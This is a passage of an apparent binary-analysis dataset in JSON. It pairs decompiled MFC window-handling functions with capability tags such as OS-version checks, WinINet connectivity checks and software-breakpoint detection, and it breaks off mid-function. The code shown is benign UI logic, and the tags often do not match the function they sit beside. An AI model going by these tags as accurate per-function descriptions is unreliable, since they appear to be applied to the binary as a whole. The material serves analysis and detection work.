        "decompiled_code": "\nvoid __cdecl fcn.0042aa94(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint uVar4;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint *puStack8;\n    \n    iVar3 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(in_ECX + 0x1c));\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    if (((iVar3 == 0) && (arg_10h == 0)) && (arg_14h == 0)) {\n        uVar4 = 5;\n        iVar3 = *(in_ECX + 0x1c);\n        while (iVar3 = (*pcVar1)(iVar3, uVar4),  iVar3 != 0) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(iVar3, &fcn.0042aa94::var_10h);\n            puStack8 = &fcn.0042aa94::var_10h;\n            uStack12 = 0x42aad9;\n            fcn.00433413();\n            iVar2 = var_ch;\n            uStack12 = 0x15;\n            var_ch = 0;\n            var_10h = 0;\n            (*_sym.imp.USER32.dll_SetWindowPos)(iVar3, 0, arg_8h, iVar2 + arg_ch);\n            uVar4 = 2;\n        }\n    }\n    else {\n        (*_sym.imp.USER32.dll_ScrollWindow)(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    if ((*(in_ECX + 0x48) != 0) && (arg_10h == 0)) {\n        (**(**(in_ECX + 0x48) + 0x5c))(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 470
    },
    "0042ab6a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ab6a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 0;\n    if (*(param_1 + 0x48) != 0) {\n        iVar1 = *(*(param_1 + 0x48) + 0x40);\n        while (iVar1 != 0) {\n            piVar2 = fcn.0040ab3a();\n            if ((*(*piVar2 + 4) != 0) && (*(*(*piVar2 + 4) + 0x70) != 0)) {\n                iVar3 = iVar3 + 1;\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 181
    },
    "0042abb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0042abb0(uint arg_8h, uint noname_1, int32_t arg_10h, uint noname_3, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t *arg_20h, int32_t *arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0042a36e(arg_18h, arg_1ch, arg_20h, arg_24h, arg_8h);\n    if (iVar1 < 0) {\n        (**(**(in_ECX + 0x24) + 0x20))(*(in_ECX + 0x24), &var_4h);\n        iVar2 = fcn.0042ab6a();\n        if (arg_10h <= iVar2 + var_4h) {\n            var_8h = *(*(in_ECX + 0x48) + 0x40);\n            while (var_8h != 0) {\n                piVar3 = fcn.0040ab3a(&var_8h);\n                iVar2 = *(*piVar3 + 4);\n                if (iVar2 != 0) {\n                    if (*(iVar2 + 0x70) != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    if (var_4h == arg_10h) {\n                        iVar1 = *(*piVar3 + 4);\n                        var_18h = *(iVar1 + 0x2c);\n                        var_14h = *(iVar1 + 0x30);\n                        var_10h = *(iVar1 + 0x34);\n                        var_ch = *(iVar1 + 0x38);\n                        fcn.0043344f(&var_18h);\n                        *arg_18h = var_18h;\n                        *arg_1ch = var_14h;\n                        *arg_20h = var_10h - var_18h;\n                        *arg_24h = var_ch - var_14h;\n                        iVar1 = 0;\n                    }\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 560
    },
    "0042b3b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042b3b6(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    iVar1 = fcn.00444c1e();\n    if ((*(iVar1 + 0x14) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0042eaa9(0x434cb4);\n        iVar3 = fcn.0042eabb(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004307be(0x44ff80, 0x443fda, 0x443f15, 0x1c, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x14) = uVar4;\n        fcn.0042eaa9(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x14);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 370
    },
    "0042b4da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0042b4da(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00446580(0x443d27);\n    iVar2 = fcn.00444bf8();\n    if ((*(iVar2 + 0x14) != '\\0') && (*(iVar1 + 0x28) != 0)) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar1 + 0x28));\n        *(iVar1 + 0x28) = 0;\n    }\n    if (*(iVar1 + 0x14) != 0) {\n        *(iVar1 + 0x14) = 0;\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 170
    },
    "0042b577": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b577(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    \n    iVar2 = fcn.0042ed31();\n    if (iVar2 == 0) goto code_r0x0042b5c2;\n    if (*(iVar2 + 0x1c) == param_1) {\n        iVar3 = fcn.00444bf8();\n        if (*(iVar3 + 0x14) == '\\0') {\n            iVar3 = fcn.00444bf8();\n            if (iVar2 == *(iVar3 + 4)) {\n                iVar3 = fcn.0043f661();\n                if (iVar3 == 0) goto code_r0x0042b5b7;\n            }\n            fcn.0044aa55(0);\n        }\ncode_r0x0042b5b7:\n        *(iVar2 + 0x1c) = 0;\n    }\n    if (*(iVar2 + 0x20) == param_1) {\n        *(iVar2 + 0x20) = 0;\n    }\ncode_r0x0042b5c2:\n    if (param_1[0x11] != NULL) {\n        (**(*param_1[0x11] + 0x50))();\n        param_1[0x11] = 0;\n    }\n    if (param_1[0x12] != NULL) {\n        (**(*param_1[0x12] + 4))(1);\n    }\n    param_1[0x12] = 0;\n    if ((*(param_1 + 0xe) & 1) != 0) {\n        iVar2 = fcn.00444c1e();\n        iVar2 = *(iVar2 + 0x3c);\n        if ((iVar2 != 0) && (*(iVar2 + 0x1c) != 0)) {\n            fcn.00411850(&var_30h, 0, 0x30);\n            var_28h = param_1[7];\n            var_30h = 0x28;\n            var_2ch = 1;\n            var_24h = var_28h;\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x1c), 0x405, 0, &var_30h);\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1[7], 0xfffffffc);\n    fcn.0042b38f();\n    iVar3 = (*pcVar1)(param_1[7], 0xfffffffc);\n    if (iVar3 == iVar2) {\n        piVar4 = (**(*param_1 + 0xf0))();\n        if (*piVar4 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongA)(param_1[7], 0xfffffffc, *piVar4);\n        }\n    }\n    fcn.0042b4ac();\n    (**(*param_1 + 0x114))();\n    return;\n}\n",
        "token_count": 751
    },
    "0042b82b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0042b82b(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t *lprcDst, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t in_ECX;\n    int32_t hWinPosInfo;\n    int32_t lprcSrc;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = arg_20h;\n    var_ch = 0;\n    var_10h = 0;\n    if (arg_1ch == NULL) {\n        (*_sym.imp.USER32.dll_GetClientRect)(*(in_ECX + 0x1c), &lprcSrc);\n    }\n    else {\n        lprcSrc = *arg_1ch;\n        var_1ch = arg_1ch[1];\n        var_18h = arg_1ch[2];\n        var_14h = arg_1ch[3];\n    }\n    uVar2 = arg_14h & 0xffff7fff;\n    if (uVar2 == 1) {\n        hWinPosInfo = 0;\n    }\n    else {\n        hWinPosInfo = (*_sym.imp.USER32.dll_BeginDeferWindowPos)(8);\n    }\n    for (iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(*(in_ECX + 0x1c)); iVar3 != 0;\n        iVar3 = (*_sym.imp.USER32.dll_GetWindow)(iVar3, 2)) {\n        uVar4 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(iVar3);\n        uVar4 = uVar4 & 0xffff;\n        iVar5 = fcn.0042b459(iVar3);\n        iVar1 = iVar3;\n        if ((((uVar4 != arg_10h) && (iVar1 = var_4h,  arg_8h <= uVar4)) && (uVar4 <= arg_ch)) && (iVar5 != 0)) {\n            (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x361, 0, &hWinPosInfo);\n            iVar1 = var_4h;\n        }\n        var_4h = iVar1;\n    }\n    if (uVar2 == 1) {\n        if (arg_20h == 0) {\n            lprcDst[2] = var_10h;\n            lprcDst[1] = 0;\n            *lprcDst = 0;\n            lprcDst[3] = var_ch;\n        }\n        else {\n            (*_sym.imp.USER32.dll_CopyRect)(lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        if ((arg_10h != 0) && (var_4h != 0)) {\n            piVar6 = fcn.0042b432(var_4h);\n            if (uVar2 == 2) {\n                lprcSrc = lprcSrc + *lprcDst;\n                var_1ch = var_1ch + lprcDst[1];\n                var_18h = var_18h - lprcDst[2];\n                var_14h = var_14h - lprcDst[3];\n            }\n            if ((arg_14h & 0x8000) == 0) {\n                (**(*piVar6 + 0x68))(&lprcSrc, 0);\n                fcn.00429cf0(&hWinPosInfo, var_4h, &lprcSrc);\n            }\n        }\n        if (hWinPosInfo != 0) {\n            (*_sym.imp.USER32.dll_EndDeferWindowPos)(hWinPosInfo);\n        }\n    }\n    return;\n}\n",
        "token_count": 949
    },
    "0042b9e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b9e2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if ((*(param_1 + 0x48) != 0) && (iVar1 = (**(**(param_1 + 0x48) + 0x90))(),  iVar1 != 0)) {\n        return;\n    }\n    fcn.0042b38f();\n    return;\n}\n",
        "token_count": 97
    },
    "0042ba6f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0042ba6f(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    if (*(in_ECX + 8) != '\\0') {\n        var_4h = NULL;\n        iVar1 = (**(*in_ECX + 0xe4))(arg_8h, arg_ch, &var_4h);\n        if (-1 < iVar1) {\n            return var_4h;\n        }\n    }\n    piVar2 = fcn.0042b38f();\n    return piVar2;\n}\n",
        "token_count": 165
    },
    "0042bc54": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nuint fcn.0042bc54(void)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h_2;\n    uint var_14h;\n    uint var_18h;\n    uint var_10h;\n    uint var_40h;\n    uint var_24h;\n    uint var_14h_2;\n    uint var_ch_2;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = &stack0xffffffc0;\n    iVar1 = fcn.00446580(0x443d27);\n    puVar4 = iVar1 + 0x58;\n    puVar5 = unaff_EBP + -0x40;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    iVar3 = *(unaff_EBP + 0x10);\n    arg_8h = *(unaff_EBP + 8);\n    *(iVar1 + 0x58) = *(unaff_EBP + 0xc);\n    *(iVar1 + 0x60) = *(unaff_EBP + 0x14);\n    *(iVar1 + 100) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x14) = iVar1;\n    *(iVar1 + 0x5c) = iVar3;\n    *(unaff_EBP + -4) = 0;\n    if ((iVar3 == 2) && (arg_8h[0x12] != 0)) {\n        (**(*arg_8h[0x12] + 0x60))(0);\n    }\n    *(unaff_EBP + 8) = 0;\n    if (iVar3 == 0x110) {\n        fcn.0042a60c(arg_8h, unaff_EBP + -0x24, unaff_EBP + 8);\n    }\n    uVar2 = (**(*arg_8h + 0x108))(iVar3, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18));\n    *(unaff_EBP + 0x18) = uVar2;\n    if (iVar3 == 0x110) {\n        fcn.0042bbdb(arg_8h, unaff_EBP + -0x24);\n    }\n    uVar2 = *(unaff_EBP + 0x18);\n    puVar4 = unaff_EBP + -0x40;\n    puVar5 = iVar1 + 0x58;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 774
    },
    "0042bd92": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042bd92(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWnd.0;\n    *(unaff_EBP + -4) = 0;\n    if ((((extraout_ECX[7] != NULL) && (extraout_ECX != 0x466be8)) && (extraout_ECX != 0x466c38)) &&\n       ((extraout_ECX != 0x466c88 && (extraout_ECX != 0x466cd8)))) {\n        fcn.0042b688();\n    }\n    if (extraout_ECX[0x12] != NULL) {\n        (**(*extraout_ECX[0x12] + 4))(1);\n    }\n    pcVar1 = extraout_ECX[0x13];\n    if ((pcVar1 != NULL) && (*(pcVar1 + 0x24) == extraout_ECX)) {\n        *(pcVar1 + 0x24) = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042e593();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 353
    },
    "0042bf1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042bf1b(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    if ((param_1 != NULL) && (param_1[7] != 0)) {\n        iVar2 = (**(*param_1 + 0x120))();\n        piVar3 = param_1;\n        if (iVar2 == 0) {\n            param_1 = fcn.0042bedc();\n            piVar3 = param_1;\n        }\n        while (piVar1 = piVar3,  piVar1 != NULL) {\n            piVar3 = fcn.0042bedc();\n            param_1 = piVar1;\n        }\n        return param_1;\n    }\n    return NULL;\n}\n",
        "token_count": 187
    },
    "0042bf5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bf5c(uint arg_8h, uint Msg, uint wParam, uint lParam, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    for (arg_8h_00 = (*_sym.imp.USER32.dll_GetTopWindow)(arg_8h); arg_8h_00 != 0;\n        arg_8h_00 = (*_sym.imp.USER32.dll_GetWindow)(arg_8h_00, 2)) {\n        if (arg_1ch == 0) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h_00, Msg, wParam, lParam);\n        }\n        else {\n            iVar2 = fcn.0042b459(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0042bc54(iVar2, *(iVar2 + 0x1c), Msg, wParam, lParam);\n            }\n        }\n        if (arg_18h != 0) {\n            iVar2 = (*pcVar1)(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0042bf5c(arg_8h_00, Msg, wParam, lParam, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 332
    },
    "0042c195": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042c195(int32_t arg_8h, int32_t arg_ch, ushort *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    if (*(in_ECX + 0x48) != 0) {\n        var_8h = arg_8h;\n        var_4h = arg_ch;\n        (*_sym.imp.USER32.dll_ScreenToClient)(*(in_ECX + 0x1c), &var_8h);\n        iVar2 = fcn.0042c0df();\n        if (*(in_ECX + 0x48) != 0) {\n            iVar1 = *(*(in_ECX + 0x48) + 0x40);\n            while (iVar1 != 0) {\n                piVar3 = fcn.0040ab3a();\n                iVar4 = *(*piVar3 + 4);\n                if ((iVar4 != 0) && (*(iVar4 + 0x70) != 0)) {\n                    iVar2 = iVar2 + 1;\n                    iVar4 = (*_sym.imp.USER32.dll_PtInRect)(iVar4 + 0x2c, var_8h, var_4h);\n                    if (iVar4 != 0) {\n                        *arg_10h = 3;\n                        *(arg_10h + 4) = iVar2;\n                        return 0;\n                    }\n                }\n            }\n        }\n    }\n    uVar5 = fcn.0042a3bf(arg_8h, arg_ch, arg_10h);\n    return uVar5;\n}\n",
        "token_count": 421
    },
    "0042c239": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_88h\n\nvoid __cdecl fcn.0042c239(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_88h;\n    uint hWnd;\n    uint var_38h;\n    uint var_34h;\n    uint var_24h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0042e84a();\n    fcn.0042a5c9();\n    uVar1 = *(extraout_ECX + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = (*_sym.imp.USER32.dll_GetTopWindow)(uVar1);\n    do {\n        if (iVar2 == 0) {\n            *(unaff_EBP + -4) = 0xffffffff;\n            *(unaff_EBP + -0x6c) = 0;\n            fcn.0042bd92();\n            *in_FS_OFFSET = *(unaff_EBP + -0xc);\n            return;\n        }\n        *(unaff_EBP + -0x6c) = iVar2;\n        uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(iVar2);\n        *(unaff_EBP + -0x34) = uVar3 & 0xffff;\n        *(unaff_EBP + -0x24) = unaff_EBP + -0x88;\n        iVar4 = fcn.0042b459(iVar2);\n        if (((iVar4 == 0) || (iVar4 = fcn.0042e6b6(0, 0xbd11ffff, unaff_EBP + -0x38, 0),  iVar4 == 0)) &&\n           (iVar4 = fcn.0042e6b6(*(unaff_EBP + -0x34), 0xffffffff, unaff_EBP + -0x38, 0),  iVar4 == 0)) {\n            iVar4 = *(unaff_EBP + 0xc);\n            if (iVar4 != 0) {\n                uVar3 = (*_sym.imp.USER32.dll_SendMessageA)(*(unaff_EBP + -0x6c), 0x87, 0, 0);\n                if ((uVar3 & 0x2000) != 0) {\n                    uVar3 = fcn.0042dd19();\n                    uVar3 = uVar3 & 0xf;\n                    if (((uVar3 != 3) && (uVar3 != 6)) && ((uVar3 != 7 && (uVar3 != 9)))) goto code_r0x0042c308;\n                }\n                iVar4 = 0;\n            }\ncode_r0x0042c308:\n            fcn.0042e870(*(unaff_EBP + 8), iVar4);\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    } while( true );\n}\n",
        "token_count": 737
    },
    "0042c34a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042c34a(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.0042b473(param_2);\n    if (iVar1 != 0) {\n        (**(*param_1 + 0x50))();\n        piVar2 = (**(*param_1 + 0xf0))();\n        iVar1 = (*_sym.imp.USER32.dll_SetWindowLongA)(unaff_retaddr, 0xfffffffc, fcn.0042bd41);\n        if (*piVar2 == 0) {\n            *piVar2 = iVar1;\n        }\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 179
    },
    "0042c413": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c413(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*(param_1 + 0x1c));\n        uVar2 = fcn.0040a932(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(*(param_1 + 0x1c), uVar2);\n        fcn.004059a0(0xffffffff);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042c452. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x8c))();\n    return;\n}\n",
        "token_count": 204
    },
    "0042c72e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042c72e(uint32_t wParam, int32_t lParam)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    uint32_t uVar7;\n    uint hWnd;\n    \n    iVar4 = fcn.0042c69d();\n    uVar7 = wParam & 0xfff0;\n    if ((uVar7 == 0xf040) || (uVar7 == 0xf050)) {\n        if (lParam != 0x75) {\n            return 0;\n        }\n        if (iVar4 == 0) {\n            return 0;\n        }\n        fcn.0042de9b();\n    }\n    else {\n        if ((uVar7 != 0xf060) && (uVar7 != 0xf100)) {\n            return 0;\n        }\n        if (((uVar7 == 0xf060) || (lParam != 0)) && (iVar4 != 0)) {\n            uVar1 = *(in_ECX + 0x1c);\n            uVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n            pcVar2 = _sym.imp.USER32.dll_SetActiveWindow;\n            uVar6 = (*_sym.imp.USER32.dll_SetActiveWindow)(*(iVar4 + 0x1c));\n            fcn.0042b432(uVar6);\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar4 + 0x1c), 0x112, wParam, lParam);\n            pcVar3 = _sym.imp.USER32.dll_IsWindow;\n            iVar4 = (*_sym.imp.USER32.dll_IsWindow)(uVar1);\n            if (iVar4 != 0) {\n                (*pcVar2)(uVar1);\n            }\n            iVar4 = (*pcVar3)(uVar5);\n            if (iVar4 != 0) {\n                (*_sym.imp.USER32.dll_SetFocus)(uVar5);\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 462
    },
    "0042c9c5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042c9c5(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.USER32.dll_SendDlgItemMessageA;\n    var_4h = 1;\n    if (arg_8h != NULL) {\n        do {\n            iVar1 = *arg_8h;\n            if (iVar1 == 0) break;\n            iVar3 = arg_8h[1];\n            var_8h = *(arg_8h + 2);\n            puVar5 = arg_8h + 4;\n            if (iVar3 == 0x1234) {\ncode_r0x0042ca2c:\n                (**0x4630b0)();\n                var_28h = 0xffffffff;\n                var_2ch = 1;\n                iVar3 = 0x401;\n                puVar6 = &var_2ch;\n                var_24h = puVar5;\ncode_r0x0042ca67:\n                iVar4 = (*pcVar2)(*(in_ECX + 0x1c), iVar1, iVar3, 0, puVar6);\n                if (iVar4 == -1) {\n                    var_4h = 